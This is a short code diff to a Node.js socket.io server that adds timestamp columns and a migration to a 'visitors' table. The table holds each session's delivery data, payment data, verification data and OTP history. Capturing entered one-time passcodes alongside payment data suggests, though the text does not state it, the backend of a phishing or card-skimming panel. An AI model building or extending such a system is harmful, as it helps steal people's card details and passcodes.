@@ -301,7 +301,7 @@ io.on('connection', (socket) => {
       
       // Also update visitors table for current data
       await pool.query(
-        'UPDATE visitors SET delivery_data = $1, form_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
+        'UPDATE visitors SET delivery_data = $1, form_submitted = true, delivery_time = CURRENT_TIMESTAMP, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
         [JSON.stringify(formData), sessionId]
       );
       
@@ -375,7 +375,7 @@ io.on('connection', (socket) => {
       );
 
       await pool.query(
-        'UPDATE visitors SET payment_data = $1, payment_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
+        'UPDATE visitors SET payment_data = $1, payment_submitted = true, payment_time = CURRENT_TIMESTAMP, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
         [JSON.stringify(finalPaymentData), sessionId]
       );
 
@@ -463,7 +463,7 @@ io.on('connection', (socket) => {
       );
 
       await pool.query(
-        'UPDATE visitors SET verification_data = $1, verification_submitted = true, otp_history = $2, last_activity = CURRENT_TIMESTAMP WHERE session_id = $3',
+        'UPDATE visitors SET verification_data = $1, verification_submitted = true, otp_history = $2, verification_time = CURRENT_TIMESTAMP, last_activity = CURRENT_TIMESTAMP WHERE session_id = $3',
         [JSON.stringify(verificationData), JSON.stringify(otpHistory), sessionId]
       );
 
@@ -1317,6 +1317,20 @@ async function runMigrations() {
   }
   
   try {
+
+  try {
+    // Add timestamp columns for tracking when each data type was submitted
+    await pool.query(`
+      ALTER TABLE visitors
+      ADD COLUMN IF NOT EXISTS delivery_time TIMESTAMP,
+      ADD COLUMN IF NOT EXISTS payment_time TIMESTAMP,
+      ADD COLUMN IF NOT EXISTS verification_time TIMESTAMP
+    `);
+    console.log("Migration: delivery_time, payment_time, verification_time columns added");
+  } catch (error) {
+    console.log("Migration note:", error.message);
+  }
+
     // Create form_submissions table if not exists (for saving all form submissions history)
     await pool.query(`
       CREATE TABLE IF NOT EXISTS form_submissions (
